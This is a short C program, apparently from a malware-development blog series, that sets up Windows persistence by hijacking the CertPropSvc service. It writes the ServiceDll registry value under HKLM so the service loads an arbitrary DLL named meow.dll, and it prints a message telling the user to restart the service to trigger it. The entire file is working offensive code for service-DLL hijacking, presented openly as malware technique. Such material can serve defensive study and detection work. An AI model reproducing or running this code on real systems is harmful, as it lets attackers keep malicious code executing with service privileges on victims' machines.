/*
 * pers.c
 * peristence via CertPropSvc
 * author @cocomelonc
 * https://cocomelonc.github.io/malware/2025/09/14/malware-pers-28.html
*/
#include <windows.h>
#include <stdio.h>
 
int main() {
  HKEY hKey;
  const char* regPath = "SYSTEM\\CurrentControlSet\\Services\\CertPropSvc\\Parameters";
  const char* dllPath = "C:\\Windows\\System32\\meow.dll";
 
  // open or create the Parameters key
  LONG result = RegCreateKeyExA(
    HKEY_LOCAL_MACHINE,
    regPath,
    0, NULL, 0,
    KEY_SET_VALUE,
    NULL,
    &hKey,
    NULL
  );
 
  if (result != ERROR_SUCCESS) {
    printf("[-] failed to open registry key. error code: %ld\n", result);
    return 1;
  }
 
  // set DLL path
  result = RegSetValueExA(
    hKey,
    "ServiceDll",
    0,
    REG_EXPAND_SZ,
    (const BYTE*)dllPath,
    (DWORD)(strlen(dllPath) + 1)
  );
 
  RegCloseKey(hKey);
 
  if (result == ERROR_SUCCESS) {
    printf("[+] meow! dll path set successfully. reboot or restart CertPropSvc to trigger.\n");
  } else {
    printf("[-] failed to set DllPath. code: %ld\n", result);
  }
 
  return 0;
}
 